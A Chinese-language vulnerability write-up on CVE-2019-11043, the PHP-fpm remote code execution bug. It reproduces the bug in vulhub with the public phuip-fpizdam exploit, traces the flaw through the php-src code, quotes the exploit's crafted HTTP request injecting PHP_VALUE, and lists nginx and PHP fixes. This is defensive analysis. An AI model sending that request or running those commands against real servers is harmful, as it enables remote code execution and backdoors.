---
title: PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析
date: 2019-10-25 15:36:01
tags:
- php
- rce
---

国外安全研究员 Andrew Danau在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。

2019年10月23日，github公开漏洞相关的详情以及exp。当nginx配置不当时，会导致php-fpm远程任意代码执行。

下面我们就来一点点看看漏洞的详细分析，文章中漏洞分析部分感谢团队小伙伴@Hcamael#知道创宇404实验室

<!--more-->

# 漏洞复现

为了能更方便的复现漏洞，这里我们采用vulhub来构建漏洞环境。

```
https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043
```

`git pull`并`docker-compose up -d`

访问`http://{your_ip}:8080/`

![image.png-30.9kB][1]

下载github上公开的exp(需要go环境)。

```
go get github.com/neex/phuip-fpizdam
```

然后编译
```
go install github.com/neex/phuip-fpizdam
```

使用exp攻击demo网站
```
phuip-fpizdam http://{your_ip}:8080/
```

![image.png-461.3kB][2]

![image.png-46.1kB][3]

攻击成功

# 漏洞分析

在分析漏洞原理之前，我们这里可以直接跟入看修复的commit

-[https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227](https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227)

![image.png-26.7kB][4]

从commit中我们可以很清晰的看出来漏洞成因应该是`path_info`的地址可控导致的，再结合漏洞发现者公开的漏洞信息中提到

```
The regexp in `fastcgi_split_path_info` directive can be broken using the newline character (in encoded form, %0a). Broken regexp leads to empty PATH_INFO, which triggers the bug.
```

也就是说，当`path_info`被%0a截断时，`path_info`将被置为空，回到代码中我就不难发现问题所在了。

![image.png-67.8kB][5]

其中`env_path_info `就是变量`path_info`的地址，`path_info`为0则`plien`为0.

`slen`变量来自于请求后url的长度

```
    int ptlen = strlen(pt);
    int slen = len - ptlen;
```
其中
```
int len = script_path_translated_len;

len为url路径长度
当请求url为http://127.0.0.1/index.php/123%0atest.php
script_path_translated来自于nginx的配置，为/var/www/html/index.php/123\ntest.php

ptlen则为url路径第一个斜杠之前的内容长度
当请求url为http://127.0.0.1/index.php/123%0atest.php
pt为/var/www/html/index.php

```
**这两个变量的差就是后面的路径长度，由于路径可控，则`path_info`可控。**

![image.png-48.2kB][6]

由于`path_info`可控，在1222行我们就可以将指定地址的值置零，根据漏洞发现者的描述，通过将指定的地址的值置零，可以控制使`_fcgi_data_seg`结构体的`char* pos`置零。

![image.png-25kB][7]


其中`script_name`同样来自于请求的配置

![image.png-15.2kB][8]

而为什么我们使`_fcgi_data_seg`结构体的`char* pos`置零，就会影响到`FCGI_PUTENV`的结果呢？

这里我们深入去看`FCGI_PUTENV`的定义.

```
char* fcgi_quick_putenv(fcgi_request *req, char* var, int var_len, unsigned int hash_value, char* val);
```
跟入函数`fcgi_quick_putenv`

[https://github.com/php/php-src/blob/5d6e923d46a89fe9cd8fb6c3a6da675aa67197b4/main/fastcgi.c#L1703](https://github.com/php/php-src/blob/5d6e923d46a89fe9cd8fb6c3a6da675aa67197b4/main/fastcgi.c#L1703)

![image.png-18.2kB][9]

函数直接操作request的env，而这个参数在前面被预定义。

[https://github.com/php/php-src/blob/5d6e923d46a89fe9cd8fb6c3a6da675aa67197b4/main/fastcgi.c#L908](https://github.com/php/php-src/blob/5d6e923d46a89fe9cd8fb6c3a6da675aa67197b4/main/fastcgi.c#L908)

![image.png-15.4kB][10]

继续跟进初始化函数`fcgi_hash_init`.

[https://github.com/php/php-src/blob/5d6e923d46a89fe9cd8fb6c3a6da675aa67197b4/main/fastcgi.c#L254](https://github.com/php/php-src/blob/5d6e923d46a89fe9cd8fb6c3a6da675aa67197b4/main/fastcgi.c#L254)

![image.png-27.5kB][11]

也就是说`request->env`就是前面提到的`fcgi_data_seg`结构体，而这里的`request->env`是nginx在和fastcgi通信时储存的全局变量。

部分全局变量会在nginx的配置中定义
![image.png-106.6kB][13]

其中变量会在堆上相应的位置储存
![image.png-42.3kB][12]

回到利用过程中，这里我们通过控制`path_info`指向`request->env`来使`request->env->pos`置零。

继续回到赋值函数`fcgi_hash_set`函数

![image.png-64.8kB][14]

紧接着进入`fcgi_hash_strndup`

![image.png-40.4kB][15]

**这里`h->data-》pos`的最低位被置为0，且str可控，就相当于我们可以在前面写入数据。**

而问题就在于，我们怎么能向我们想要的位置写数据呢？又怎么向我们指定的配置写文件呢？

这里我们拿exp发送的利用数据包做例子
```
GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
Host: ubuntu.local:8080
User-Agent: Mozilla/5.0
D-Gisos: 8=====================================D
Ebut: mamku tvoyu
```

在数据包中，header中的最后两部分就是为了完成这部分功能，其中`D-Gisos`负责位移，向指定的位置写入数据。

**而`Ebut`会转化为`HTTP_EBUT`这个`fastcgi_param`中的其中一个全局变量**，然后我们需要了解一下`fastcgi`中全局变量的获取数据的方法。

[https://github.com/php/php-src/blob/5d6e923d46a89fe9cd8fb6c3a6da675aa67197b4/main/fastcgi.c#L328](https://github.com/php/php-src/blob/5d6e923d46a89fe9cd8fb6c3a6da675aa67197b4/main/fastcgi.c#L328)

![image.png-36.6kB][16]

可以看到当fastcgi想要获取全局变量时，会读取指定位置的长度字符做对比，然后读取一个字符串作为value.

也就是说，**只要位置合理，var值相同，且长度相同，fastcgi就会读取相对应的数据**。

而`HTTP_EBUT`和`PHP_VALUE`恰好长度相同，我们可以从堆上数据的变化来印证这一点。

在覆盖之前，该地址对应数据为
![image.png-17.2kB][17]

然后执行`fcgi_quick_putenv`
![image.png-43kB][18]

该地址对应数据变为
![image.png-22.2kB][19]

**我们成功写入了`PHP_VALUE`并控制其内容，这也就意味着我们可以控制PHP的任意全局变量。**

当我们可以控制PHP的任意全局变量就有很多种攻击方式，这里直接以EXP中使用到的攻击方式来举例子。

![image.png-87.5kB][20]

exp作者通过开启自动包含，并设置包含目录为`/tmp`，之后设置log地址为`/tmp/a`并将payload写入log文件，通过`auto_prepend_file`自动包含`/tmp/a`文件构造后门文件。

# 漏洞修复

在经过对漏洞的深入研究后，我们推荐两种方案修复这个漏洞。

- 临时修复：

修改nginx相应的配置，并在php相关的配置中加入
```
    try_files $uri =404
```

在这种情况下，会有nginx去检查文件是否存在，当文件不存在时，请求都不会被传递到php-fpm。

- 正式修复：

    - 将PHP 7.1.X更新至7.1.33
    https://github.com/php/php-src/releases/tag/php-7.1.33
    - 将PHP 7.2.X更新至7.2.24
    https://github.com/php/php-src/releases/tag/php-7.2.24
    - 将PHP 7.3.X更新至7.3.11
    https://github.com/php/php-src/releases/tag/php-7.3.11


# 漏洞影响

结合EXP github中提到的利用条件，我们可以尽可能的总结利用条件以及漏洞影响范围。

1、Nginx + php_fpm，且配置`location ~ [^/]\.php(/|$)`会将请求转发到php-fpm。
2、Nginx配置`fastcgi_split_path_info `并且以`^`开始以`$`，只有在这种条件下才可以通过换行符来打断正则表达式判断。
ps: 则允许`index.php/321 -> index.php`
```
fastcgi_split_path_info ^(.+?\.php)(/.*)$;
```
3、`fastcgi_param`中`PATH_INFO`会被定义通过`fastcgi_param PATH_INFO $fastcgi_path_info;`，当然这个变量会在`fastcgi_params`默认定义。
4、在nginx层面没有定义对文件的检查比如`try_files $uri =404`，如果nginx层面做了文件检查，则请求不会被转发给php-fmp。

这个漏洞在实际研究过程中对真实世界危害有限，其主要原因都在于大部分的nginx配置中都携带了对文件的检查，且默认的nginx配置不包含这个问题。

但也正是由于这个原因，在许多网上的范例代码或者部分没有考虑到这个问题的环境，例如Nginx官方文档中的范例配置、NextCloud默认环境，都出现了这个问题，该漏洞也正真实的威胁着许多服务器的安全。

在这种情况下，这个漏洞也切切实实的陷入了黑暗森林法则，一旦有某个带有问题的配置被传播，其导致的可能就是大批量的服务受到牵连，确保及时的更新永远是对保护最好的手段:>


# REF
- [漏洞issue](https://bugs.php.net/bug.php?id=78599)
- [漏洞发现者提供的环境](https://www.dropbox.com/s/eio9zikkg1juuj7/reproducer.tar.xz?dl=0&file_subpath=%2Freproducer)
- [漏洞exp](https://github.com/neex/phuip-fpizdam)
- [漏洞成因代码段](https://github.com/php/php-src/blob/ab061f95ca966731b1c84cf5b7b20155c0a1c06a/sapi/fpm/fpm/fpm_main.c)
- [漏洞修复commit](https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227)
- [vulhub](https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043)
- [https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/](https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/)
- [Seebug漏洞收录](https://www.seebug.org/vuldb/ssvid-98092)


  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/gtaoe2qzu23jqlor19h9ekk2/image.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/xunv27e9x9m37f4mt5pdfer0/image.png
  [3]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/ftvbht678sn2nphjdbcl22tl/image.png
  [4]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/mkksignc4dyhq3r82ca3izl7/image.png
  [5]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/bbnnfl20ok92m55gllb2fuut/image.png
  [6]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/z34k8g2l3n164gxtvc9vnkza/image.png
  [7]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/qsdebu0frycf0ll7ufh5whjn/image.png
  [8]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/lu3pxmzan3ovcsrovjqd370j/image.png
  [9]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/ongrhbf55wijkn96po90x8ut/image.png
  [10]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/gcw6kxemnzlx8ky8p84372nu/image.png
  [11]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/ih2oqme6wvz59ow3gpocb6uw/image.png
  [12]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/klo3qq8ncxpx4om6al1oo542/image.png
  [13]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/vcboq2vtunordtzg69akt5q5/image.png
  [14]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/iz5rlrdvqzotoa9vrev8blgk/image.png
  [15]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/9unn9m4f2lz4msbmxrign9ey/image.png
  [16]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/90ucb41qfbzyw2pdqkqxigjq/image.png
  [17]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/4artit888vz899q9wdyjyoaw/image.png
  [18]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/kpr6ntpn3isxdo47dkvxjsv1/image.png
  [19]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/6s2ihq8fspplh5g2xgluxdwn/image.png
  [20]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/qa4j0e4fk1azicefpqjg9r0q/image.png
